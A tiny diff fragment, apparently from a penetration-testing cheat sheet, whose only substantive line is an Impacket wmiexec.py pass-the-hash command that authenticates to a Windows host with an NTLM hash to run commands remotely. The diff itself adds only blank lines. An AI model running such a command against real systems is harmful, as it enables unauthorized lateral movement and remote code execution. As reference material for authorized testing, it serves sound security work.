@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:57.936960+00:00'
 ```bash
 wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
+
+
